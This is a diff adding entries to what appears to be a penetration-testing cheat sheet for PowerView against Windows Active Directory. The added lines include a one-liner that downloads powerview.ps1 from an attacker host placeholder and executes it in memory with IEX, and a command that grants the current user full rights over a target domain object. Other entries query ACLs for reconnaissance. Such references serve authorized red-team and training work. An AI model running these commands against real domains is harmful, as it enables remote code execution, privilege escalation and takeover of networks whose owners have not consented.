@@ -2,6 +2,15 @@
 
 % ad, windows, powerview
 
+## load from remote
+#plateform/windows #target/remote  #cat/RECON 
+
+https://github.com/PowerShellMafia/PowerSploit/
+
+```powershell
+(new-object system.net.webclient).downloadstring('http://<lhost>/powerview.ps1') | IEX
+```
+
 ## Get User from SID
 #plateform/windows #target/remote  #cat/RECON 
 ```powershell
@@ -18,6 +27,12 @@ Get-ObjectAcl -Identity <user> -ResolveGUIDs | Foreach-Object {$_ | Add-Member -
 #plateform/windows #target/remote  #cat/RECON 
 ```powershell
 Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+```
+
+## Add user DACL
+#plateform/windows #target/remote  #cat/ATTACK
+```powershell
+Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <current_user> -Rights All
 ```
 
 ## Find all groups our current user got access
